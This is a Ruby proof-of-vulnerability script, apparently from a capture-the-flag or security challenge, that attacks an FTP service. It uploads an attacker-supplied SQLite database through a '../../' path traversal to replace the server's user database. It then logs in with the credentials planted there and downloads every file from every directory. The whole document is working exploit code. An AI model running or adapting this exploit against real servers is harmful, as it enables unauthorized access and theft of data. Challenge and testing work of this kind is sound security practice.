#!/bin/env ruby

require 'fileutils'
require "logger"

require 'securerandom'
require 'active_record'

require "net/ftp"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

class User < ActiveRecord::Base
end

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = (ENV['PORT'] || 3038).to_i
  end

  def run!
    hacker_db = File.join(__dir__, 'kensington.sqlite3')
    Net::FTP.open(@host, port: @port,
      username: 'anonymous', password: mk_name) do |ftp|
      ftp.binary = true
      ftp.passive = false

      ftp.put hacker_db, '../../kensington.sqlite3'
    end

    stash = "/tmp/pov-#{Time.now.to_i}-#{rand(1_000)}"
    FileUtils.mkdir_p stash
    LLL.info "dumping ftp server to #{stash}"

    Net::FTP.open(@host, port: @port,
      username: 'casper', password: 'asdf') do |ftp|
      ftp.binary = true
      ftp.passive = false

      directories = ftp.list.
        select{|e| e =~ /^d/}.
        map{|e| e.split(' ').last}

      p directories

      directories.each do |dir|
        FileUtils.mkdir(File.join(stash, dir))
        Dir.chdir File.join(stash, dir) do

          ftp.chdir dir
          files = ftp.list.
            select{|e| e =~ /^-/}.
            map{|e| e.split(' ').last}

          files.each {|f| ftp.get f}
          ftp.chdir '..'
        end
      end

    end
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end

  # make a random string with two random words and a random number
  def mk_name
    "pov-#{Time.now.to_i}-#{rand(1_000_000)}"
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
